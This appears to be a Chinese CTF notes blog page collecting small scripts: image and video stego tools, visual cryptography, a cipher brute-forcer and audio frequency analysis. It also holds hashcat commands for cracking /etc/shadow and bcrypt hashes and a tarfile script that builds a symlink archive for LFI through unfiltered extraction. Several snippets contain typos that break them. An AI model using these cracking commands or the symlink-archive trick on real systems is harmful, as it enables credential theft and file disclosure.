<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2,numpy <span class="keyword">as</span> np,matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line">cap = cv2.VideoCapture(<span class="string">&#x27;out_flag.mp4&#x27;</span>)</span><br><span class="line">ret, frame = cap.read()</span><br><span class="line">gray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)</span><br><span class="line">mask = np.zeros_like(gray).astype(np.float64)</span><br><span class="line">fr = <span class="number">0</span></span><br><span class="line">plt.figure(figsize=(<span class="number">12</span>,<span class="number">8</span>))</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    fr +=<span class="number">1</span></span><br><span class="line">    ret, frame = cap.read()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> ret:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    gray_next = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)</span><br><span class="line">    flow = cv2.calcOpticalFlowFarneback(gray, gray_next, <span class="literal">None</span>, <span class="number">0.5</span>, <span class="number">3</span>, <span class="number">15</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">1.2</span>, <span class="number">0</span>)</span><br><span class="line">    h, w = gray.shape</span><br><span class="line">    y, x = np.mgrid[<span class="number">0</span>:h:<span class="number">10</span>, <span class="number">0</span>:w:<span class="number">10</span>].reshape(<span class="number">2</span>, -<span class="number">1</span>).astype(<span class="built_in">int</span>)</span><br><span class="line">    fx, fy = flow[y, x].T</span><br><span class="line">    lines = np.vstack([x, y, x + fx, y + fy]).T.reshape(-<span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>)</span><br><span class="line">    lines = np.int32(lines + <span class="number">0.5</span>)</span><br><span class="line">    vis = np.zeros_like(gray)</span><br><span class="line">    <span class="keyword">for</span> (x1, y1), (x2, y2) <span class="keyword">in</span> lines:</span><br><span class="line">        <span class="keyword">if</span> x1 &gt; x2  <span class="keyword">and</span> y1&lt;y2:</span><br><span class="line">            cv2.line(vis, (x1, y1), (x2, y2), <span class="number">255</span> , <span class="number">2</span>)</span><br><span class="line">    mask += vis&amp;gray</span><br><span class="line">    <span class="keyword">if</span> fr % <span class="number">10</span> ==<span class="number">0</span>:</span><br><span class="line">        show=mask.copy()</span><br><span class="line">        cv2.putText(show,<span class="string">f&#x27;<span class="subst">&#123;fr&#125;</span>&#x27;</span>,(<span class="number">5</span>,<span class="number">50</span>), cv2.FONT_HERSHEY_SIMPLEX, <span class="number">0.75</span>, <span class="number">255</span>, <span class="number">2</span>)</span><br><span class="line">        cv2.imshow(<span class="string">&#x27;frame2&#x27;</span>, show)</span><br><span class="line">        <span class="keyword">if</span> cv2.waitKey(<span class="number">25</span>) &amp; <span class="number">0xFF</span> == <span class="built_in">ord</span>(<span class="string">&#x27;q&#x27;</span>):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    gray=gray_next</span><br><span class="line">plt.imshow(np.log(mask))</span><br><span class="line">plt.imshow(np.log(mask+<span class="number">1</span>))</span><br><span class="line">plt.show()</span><br><span class="line">cap.release()</span><br><span class="line">cv2.destroyAllWindows()</span><br></pre></td></tr></table></figure>

<h2 id="Visual-cryptography-python脚本"><a href="#Visual-cryptography-python脚本" class="headerlink" title="Visual cryptography python脚本"></a><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Visual_cryptography">Visual cryptography</a> python脚本</h2><p>大概就是把两张黑白图片叠在一起，就能看见要传递的内容。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">im1 = Image.<span class="built_in">open</span>(<span class="string">&quot;1.png&quot;</span>)</span><br><span class="line">im2 = Image.<span class="built_in">open</span>(<span class="string">&quot;2.png&quot;</span>)</span><br><span class="line">iminp = np.array(im1)</span><br><span class="line">im2np = np.array(im2)</span><br><span class="line">result = im2np + im1inp</span><br><span class="line">Image.fromarray(result).save(<span class="string">&#x27;result.png&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>或者把信息用白色显现出来：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="comment"># Load the first share</span></span><br><span class="line">sharel = Image.<span class="built_in">open</span>(<span class="string">&quot;img1.png&quot;</span>) .convert(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"><span class="comment"># Load the second share</span></span><br><span class="line">share2 = Image.<span class="built_in">open</span>(<span class="string">&quot;img2.png&quot;</span>) .convert(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"><span class="comment"># Get the size of the shares</span></span><br><span class="line">width, height = sharel.size</span><br><span class="line"><span class="comment"># Create a new image for the result</span></span><br><span class="line">result = Image.new(<span class="string">&quot;1&quot;</span>, (width, height))</span><br><span class="line"><span class="comment"># Loop through each pixel in the shares and combine them</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span> (width) :</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span> (height):</span><br><span class="line">        pixell = sharel.getpixel((x, y))</span><br><span class="line">        pixel2 = share2.getpixel((x, y))</span><br><span class="line">        <span class="comment"># If both pixels are black, set the result pixel to black</span></span><br><span class="line">        <span class="keyword">if</span> pixell == <span class="number">0</span> <span class="keyword">and</span> pixel2 == <span class="number">0</span>:</span><br><span class="line">            result.putpixel((x, y), <span class="number">0</span>)</span><br><span class="line">        <span class="comment"># Otherwise, set the result pixel to white</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result.putpixel((x, y), <span class="number">255</span>)</span><br><span class="line"><span class="comment"># Save the resulting image</span></span><br><span class="line">result.save(<span class="string">&quot;result.png&quot;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="perlin-noise图片生成-对比脚本"><a href="#perlin-noise图片生成-对比脚本" class="headerlink" title="perlin noise图片生成+对比脚本"></a><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Perlin_noise">perlin noise</a>图片生成+对比脚本</h2><p>使用python模块<a target="_blank" rel="noopener" href="https://github.com/caseman/noise">noise</a>用perlin noise生成一张图片后对比另一张由perlin noise生成的图片，并把像素不同的地方标为黑色后写为结果图片。改一下也能用作两张普通图片的对比脚本。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> noise</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="comment"># Set the seed for the Perlin noise generator</span></span><br><span class="line">seed = <span class="number">2151</span></span><br><span class="line"><span class="comment"># Set the size of the image</span></span><br><span class="line">width = <span class="number">1920</span></span><br><span class="line">height = <span class="number">1080</span></span><br><span class="line"><span class="comment"># Set the scale of the Perlin noise</span></span><br><span class="line">scale = <span class="number">100.0</span></span><br><span class="line"><span class="comment"># Create an empty NumPy array for the image</span></span><br><span class="line">img_array = np.zeros((height, width))</span><br><span class="line"><span class="comment"># Loop through each pixel in the image and generate Perlin noise</span></span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">        img_array[y, x] = noise.pnoise2(x/scale, y/scale, octaves=<span class="number">6</span>, persistence=<span class="number">0.5</span>, lacunarity=<span class="number">2.0</span>,repeatx=<span class="number">1024</span>, repeaty=<span class="number">1024</span>, base=seed)</span><br><span class="line"><span class="comment"># Create a PIL image from the NumPy array</span></span><br><span class="line">img = Image.fromarray(np.uint8(img_array * <span class="number">255</span>))</span><br><span class="line">img.save(<span class="string">&quot;res.png&quot;</span>)</span><br><span class="line"><span class="comment"># Load the modified image</span></span><br><span class="line">mod_img = Image.<span class="built_in">open</span>(<span class="string">&#x27;compare.png’&#x27;</span>)</span><br><span class="line"><span class="comment"># Create a new black image for the changed pixels</span></span><br><span class="line">new_img = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (width, height), color=<span class="string">&#x27;black&#x27;</span>)</span><br><span class="line"><span class="comment"># Get the pixel access objects for the images</span></span><br><span class="line">orig_pixels = img.load()</span><br><span class="line">mod_pixels = mod_img.load()</span><br><span class="line">new_pixels = new_img.load()</span><br><span class="line"><span class="comment"># Loop through the pixels and identify changed pixels</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">        orig_pixel = orig_pixels[x, y]</span><br><span class="line">        mod_pixel = mod_ pixels[x, y]</span><br><span class="line">        <span class="keyword">if</span> orig_pixel != mod_pixel:</span><br><span class="line">            <span class="comment"># Change the pixel in the new image to white</span></span><br><span class="line">            new_pixels[x, y] = (<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>)</span><br><span class="line"><span class="comment"># Save the new image with the changed pixels in white</span></span><br><span class="line">new_img.save(<span class="string">&#x27;changed_pixels_flag.png&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="hashcat使用"><a href="#hashcat使用" class="headerlink" title="hashcat使用"></a><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/4008">hashcat使用</a></h2><p>下载：在<a target="_blank" rel="noopener" href="https://hashcat.net/hashcat/">官网</a>下载hashcat binaries，然后用<code>7z x</code>解压文件即可(7zip下载：<code>sudo apt-get install p7zip-full</code>)。linux运行<code>hashcat.bin</code>,windows运行<code>hashcat.exe</code>。</p>
<p>今天又测试了一下这个方法，发现不行。然后发现可以直接用apt安装hashcat，但是安装后用hashcat命令也不行。最后发现用apt安装hashcat后之前下载的那个binary就能用了……</p>
<p>运行时指定hash模式的-m选项可以在<a target="_blank" rel="noopener" href="https://hashcat.net/wiki/doku.php?id=example_hashes">这里</a>找到。例如爆破zip，先用<a target="_blank" rel="noopener" href="https://hashes.com/en/johntheripper/zip2john">zip2john</a>将zip转为hash，然后根据hash格式选择-m的参数。-a是爆破模式。</p>
<ul>
<li>掩码爆破：<code>./hashcat.bin -a 3 -m 13600 &#39;hash&#39; mask</code></li>
<li>字典爆破：<code>./hashcat.bin -a 0 -m 13600 &#39;hash&#39; dict</code></li>
</ul>
<p>字典爆破linux &#x2F;etc&#x2F;shadow的hash： <a target="_blank" rel="noopener" href="https://null-byte.wonderhowto.com/how-to/crack-shadow-hashes-after-getting-root-linux-system-0186386/">https://null-byte.wonderhowto.com/how-to/crack-shadow-hashes-after-getting-root-linux-system-0186386/</a></p>
<ul>
<li><code>hashcat -m 500 -a 0 -o cracked.txt hashes.txt ./rockyou.txt -O</code><br>其他爆破案例：</li>
<li><code>hashcat -m 3200 -a 0 dict.txt hash.txt</code>：爆破bcrypt hash</li>
<li><code>hashcat --potfile-disable -a 3 -m 500 hash.txt -d 1</code>:爆破linux <code>/etc/shadow</code>密码hash</li>
</ul>
<h2 id="Extracting-GPS-Coordinates-from-metadata"><a href="#Extracting-GPS-Coordinates-from-metadata" class="headerlink" title="Extracting GPS Coordinates from metadata"></a>Extracting GPS Coordinates from metadata</h2><p><a target="_blank" rel="noopener" href="https://github.com/BYU-CSA/BYUCTF-2023/tree/main/lost">https://github.com/BYU-CSA/BYUCTF-2023/tree/main/lost</a></p>
<h2 id="利用numba和multiprocessing库加速爆破"><a href="#利用numba和multiprocessing库加速爆破" class="headerlink" title="利用numba和multiprocessing库加速爆破"></a>利用<a target="_blank" rel="noopener" href="http://zhaoxuhui.top/blog/2019/01/17/PythonNumba.html">numba</a>和multiprocessing库加速爆破</h2><p>感觉任何任务量较大的爆破题都可以像这题的脚本一样，一个线程爆破一个部分，同时numba提高代码执行效率。</p>
<p><a target="_blank" rel="noopener" href="https://github.com/TJCSec/tjctf-2023-challenges/tree/main/crypto/aluminum-isopropoxide">aluminum-isopropoxide</a></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> numba <span class="keyword">import</span> jit</span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Pool</span><br><span class="line"></span><br><span class="line"><span class="meta">@jit(<span class="params">nopython=<span class="literal">True</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">idx</span>):</span><br><span class="line">    f = <span class="string">b&#x27;l\x90C\x99e\x19\x03Br\x02\xd2\x98@\xf8\xe8deWOvv\x16[G&#125;GA\\\xd2rv`\x16\x18&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> key_ <span class="keyword">in</span> <span class="built_in">range</span>(idx, idx + <span class="number">2</span>**<span class="number">31</span>//<span class="number">15</span>):</span><br><span class="line">        S_box = ...</span><br><span class="line">        key_ = <span class="built_in">str</span>(key_)</span><br><span class="line">        S = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">255</span>):</span><br><span class="line">            S[i] = i</span><br><span class="line">        j = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">255</span>):</span><br><span class="line">            j = (j ^ S[i] ^ <span class="built_in">ord</span>(key_[i % <span class="built_in">len</span>(key_)])) % <span class="number">256</span></span><br><span class="line">            S[i], S[j] = S[j], S[i]</span><br><span class="line"></span><br><span class="line">        amount = <span class="built_in">len</span>(f)</span><br><span class="line">        enc = f</span><br><span class="line"></span><br><span class="line">        i = j = <span class="number">0</span></span><br><span class="line">        ctr = <span class="number">0</span></span><br><span class="line">        out = []</span><br><span class="line">        <span class="keyword">while</span> ctr &lt; amount:</span><br><span class="line">            i = (i * j) % <span class="number">256</span></span><br><span class="line">            j = (i + S[j]) % <span class="number">256</span></span><br><span class="line">            K = (S[i] &amp; S[j])</span><br><span class="line">            out.append(enc[ctr] ^ S_box[K])</span><br><span class="line">            ctr += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        dec = <span class="string">&quot;&quot;</span>.join([<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> out <span class="keyword">if</span> <span class="built_in">chr</span>(i) <span class="keyword">in</span> <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ01234566789&#125;_&#123;&quot;</span>])</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(dec) == <span class="built_in">len</span>(f):</span><br><span class="line">            <span class="built_in">print</span>(dec)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    idx = [<span class="number">0</span>,<span class="number">2</span>**<span class="number">31</span>//<span class="number">15</span>,<span class="number">2</span>**<span class="number">31</span>//<span class="number">15</span> * <span class="number">2</span>,<span class="number">2</span>**<span class="number">31</span>//<span class="number">15</span> * <span class="number">3</span>,<span class="number">2</span>**<span class="number">31</span>//<span class="number">15</span> * <span class="number">4</span>,<span class="number">2</span>**<span class="number">31</span>//<span class="number">15</span> * <span class="number">5</span>,<span class="number">2</span>**<span class="number">31</span>//<span class="number">15</span> * <span class="number">6</span>,<span class="number">2</span>**<span class="number">31</span>//<span class="number">15</span> * <span class="number">7</span>,<span class="number">2</span>**<span class="number">31</span>//<span class="number">15</span> * <span class="number">8</span>,<span class="number">2</span>**<span class="number">31</span>//<span class="number">15</span> * <span class="number">9</span>,<span class="number">2</span>**<span class="number">31</span>//<span class="number">15</span> * <span class="number">10</span>,<span class="number">2</span>**<span class="number">31</span>//<span class="number">15</span> * <span class="number">11</span>,<span class="number">2</span>**<span class="number">31</span>//<span class="number">15</span> * <span class="number">12</span>,<span class="number">2</span>**<span class="number">31</span>//<span class="number">15</span> * <span class="number">13</span>,<span class="number">2</span>**<span class="number">31</span>//<span class="number">15</span> * <span class="number">14</span>]</span><br><span class="line">    pool = Pool(<span class="number">15</span>)</span><br><span class="line">    <span class="keyword">with</span> pool:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> pool.imap_unordered(main, idx):</span><br><span class="line">            <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure>

<h2 id="python保存gif图片的每一帧"><a href="#python保存gif图片的每一帧" class="headerlink" title="python保存gif图片的每一帧"></a>python保存gif图片的每一帧</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image, ImageSequence</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">save_frames</span>(<span class="params">image_path</span>):</span><br><span class="line">    <span class="keyword">with</span> Image.<span class="built_in">open</span>(image_path) <span class="keyword">as</span> im:</span><br><span class="line">        <span class="keyword">for</span> i, frame <span class="keyword">in</span> <span class="built_in">enumerate</span>(ImageSequence.Iterator(im)):</span><br><span class="line">            frame.save(<span class="string">f&#x27;frames/frame_<span class="subst">&#123;i&#125;</span>.png&#x27;</span>, <span class="string">&#x27;PNG&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="python-tarfile使用"><a href="#python-tarfile使用" class="headerlink" title="python tarfile使用"></a>python tarfile使用</h2><p>tar.extractall支持symbolic link，只检查文件的名称是不够的，服务端不做过滤就解压可能出现LFI</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tarfile</span><br><span class="line"><span class="keyword">with</span> tarfile.<span class="built_in">open</span>(<span class="string">&#x27;exploit.tar.gz&#x27;</span>, <span class="string">&#x27;w:gz&#x27;</span>) <span class="keyword">as</span> tar:</span><br><span class="line">    <span class="comment"># First file</span></span><br><span class="line">    info1 = tarfile.TarInfo(<span class="string">&quot;test&quot;</span>)</span><br><span class="line">    info1.<span class="built_in">type</span> = tarfile.SYMTYPE</span><br><span class="line">    info1.linkname = <span class="string">&quot;/&quot;</span> </span><br><span class="line">    tar.addfile(info1)</span><br><span class="line">    <span class="comment"># Second file</span></span><br><span class="line">    info2 = tarfile.TarInfo(<span class="string">&quot;./test/name&quot;</span>) <span class="comment">#若服务端指定不能以绝对路径/开头，可以这样绕过</span></span><br><span class="line">    info2.<span class="built_in">type</span> = tarfile.SYMTYPE</span><br><span class="line">    info2.linkname = <span class="string">&quot;linkname&quot;</span></span><br><span class="line">    tar.addfile(info2)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">The TarInfo class in the tarfile module is used to represent information about a file or directory in a tar archive. It provides attributes and methods to set and retrieve various properties of the file or directory.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Here are some key attributes of the TarInfo class:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">name: The name of the file or directory. This can be an absolute or relative path.</span></span><br><span class="line"><span class="string">size: The size of the file in bytes. For directories, this is set to 0.</span></span><br><span class="line"><span class="string">mtime: The modification time of the file or directory, represented as a Unix timestamp.</span></span><br><span class="line"><span class="string">type: The type of the file or directory. This can be one of the following constants defined in the tarfile module: tarfile.REGTYPE (regular file), tarfile.DIRTYPE (directory), tarfile.LNKTYPE (hard link), tarfile.SYMTYPE (symbolic link), tarfile.CHRTYPE (character special file), tarfile.BLKTYPE (block special file), tarfile.FIFOTYPE (FIFO special file), or tarfile.CONTTYPE (contiguous file).</span></span><br><span class="line"><span class="string">linkname: The target of a hard link or symbolic link.</span></span><br><span class="line"><span class="string">uid: The user ID of the owner of the file or directory.</span></span><br><span class="line"><span class="string">gid: The group ID of the owner of the file or directory.</span></span><br><span class="line"><span class="string">mode: The permissions of the file or directory, represented as an octal number.</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<h2 id="描绘纯色背景GIF中的单一物品的轨迹"><a href="#描绘纯色背景GIF中的单一物品的轨迹" class="headerlink" title="描绘纯色背景GIF中的单一物品的轨迹"></a>描绘纯色背景GIF中的单一物品的轨迹</h2><ul>
<li><a target="_blank" rel="noopener" href="https://github.com/D13David/ctf-writeups/tree/main/tenablectf23/stego/ancient_scrawls">https://github.com/D13David/ctf-writeups/tree/main/tenablectf23/stego/ancient_scrawls</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/ITSEC-ASIA-ID/Competitions/tree/main/CTF/2023/TenableCTF/Steganography/Ancient%20Scrawls">https://github.com/ITSEC-ASIA-ID/Competitions/tree/main/CTF/2023/TenableCTF/Steganography/Ancient%20Scrawls</a></li>
</ul>
<h2 id="Mac-M1安装Ghidra"><a href="#Mac-M1安装Ghidra" class="headerlink" title="Mac M1安装Ghidra"></a>Mac M1安装Ghidra</h2><ol>
<li>去 <a target="_blank" rel="noopener" href="https://github.com/NationalSecurityAgency/ghidra">https://github.com/NationalSecurityAgency/ghidra</a> 下载最新版本ghidra</li>
<li>去 <a target="_blank" rel="noopener" href="https://www.oracle.com/java/technologies/downloads/">https://www.oracle.com/java/technologies/downloads/</a> 下载要安装的ghidra版本的最低需求jdk</li>
<li>运行ghidraRun。若要求输入jdk路径，输入jdk安装路径&#x2F;Contents&#x2F;Home</li>
</ol>
<h2 id="C语言signal号表"><a href="#C语言signal号表" class="headerlink" title="C语言signal号表"></a>C语言signal号表</h2><p><a target="_blank" rel="noopener" href="https://www-uxsup.csx.cam.ac.uk/courses/moved.Building/signals.pdf">https://www-uxsup.csx.cam.ac.uk/courses/moved.Building/signals.pdf</a></p>
<h2 id="JS下载文件"><a href="#JS下载文件" class="headerlink" title="JS下载文件"></a>JS下载文件</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">sleep</span>(<span class="params">ms</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> <span class="built_in">setTimeout</span>(resolve, ms));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">download</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;<span class="number">100</span>;i++)&#123;</span><br><span class="line">        <span class="title function_">fetch</span>(<span class="string">&#x27;url&#x27;</span>)</span><br><span class="line">        .<span class="title function_">then</span>(<span class="function"><span class="params">response</span> =&gt;</span> response.<span class="title function_">blob</span>())</span><br><span class="line">        .<span class="title function_">then</span>(<span class="function"><span class="params">blob</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">const</span> downloadLink = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">            downloadLink.<span class="property">href</span> = <span class="variable constant_">URL</span>.<span class="title function_">createObjectURL</span>(blob);</span><br><span class="line">            downloadLink.<span class="property">download</span> = <span class="string">&#x27;filename&#x27;</span>;</span><br><span class="line">            downloadLink.<span class="title function_">click</span>();</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">await</span> <span class="title function_">sleep</span>(<span class="number">500</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="python获取wav文件频率"><a href="#python获取wav文件频率" class="headerlink" title="python获取wav文件频率"></a>python获取wav文件频率</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> scipy.io.wavfile <span class="keyword">as</span> wav</span><br><span class="line">ans=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    sample_rate, audio_data = wav.read(<span class="string">&#x27;path&#x27;</span>)</span><br><span class="line">    fft_data = np.fft.fft(audio_data)</span><br><span class="line">    frequencies = np.fft.fftfreq(<span class="built_in">len</span>(fft_data), <span class="number">1</span>/sample_rate)</span><br><span class="line">    positive_frequencies = frequencies[:<span class="built_in">len</span>(frequencies)//<span class="number">2</span>]</span><br><span class="line">    magnitude_spectrum = np.<span class="built_in">abs</span>(fft_data[:<span class="built_in">len</span>(fft_data)//<span class="number">2</span>])</span><br><span class="line">    max_index = np.argmax(magnitude_spectrum)</span><br><span class="line">    max_frequency = positive_frequencies[max_index]</span><br><span class="line">    ans.append(<span class="built_in">str</span>(max_frequency)[:-<span class="number">2</span>])</span><br><span class="line"><span class="built_in">print</span>(ans)</span><br></pre></td></tr></table></figure>

